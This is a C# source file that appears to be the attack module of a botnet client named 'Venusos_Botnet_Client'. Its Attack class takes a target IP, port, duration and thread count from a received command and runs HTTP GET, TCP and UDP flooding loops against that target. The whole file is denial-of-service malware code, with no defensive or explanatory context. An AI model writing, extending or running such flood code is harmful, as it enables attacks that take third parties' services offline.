using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace Venusos_Botnet_Client
{
    public class Attack
    {
        private readonly string ip;
        private readonly int port;
        private readonly int duration;
        private readonly int threads;
        public Attack(Command command)
        {
            ip = command.IP;
            port = command.Port;
            duration = command.Duration;
            threads = command.Threads;
        }
        public void Http()
        {
            Task.Run(() =>
            {
                HttpRequestMessage request;
                Stopwatch timer = new Stopwatch();
                HttpClient httpClient = new HttpClient();

                timer.Start();

                while (timer.Elapsed.TotalSeconds < duration)
                {
                    request = new HttpRequestMessage(new HttpMethod("GET"), ip);
                    request.Headers.TryAddWithoutValidation("accept", "text/plain");
                    httpClient.SendAsync(request);
                    Thread.Sleep(1000 / threads);
                }

                timer.Stop();
            });
        }
        public void Tcp()
        {
            Task.Run(() =>
            {
                Stopwatch timer = new Stopwatch();
                NetworkStream stream = new TcpClient(ip, port).GetStream();

                timer.Start();

                while (timer.Elapsed.TotalSeconds < duration)
                {
                    stream.WriteAsync(Encoding.ASCII.GetBytes("O_O"), 0, 3);
                    Thread.Sleep(1000 / threads);
                }

                timer.Stop();
            });
        }
        public void Udp()
        {
            Task.Run(() =>
            {
                Stopwatch timer = new Stopwatch();
                UdpClient udpClient = new UdpClient(ip, port);

                timer.Start();

                while (timer.Elapsed.TotalSeconds < duration)
                {
                    udpClient.SendAsync(Encoding.ASCII.GetBytes("^_^"), 3);
                    Thread.Sleep(1000 / threads);
                }

                timer.Stop();
            });
        }
    }
}
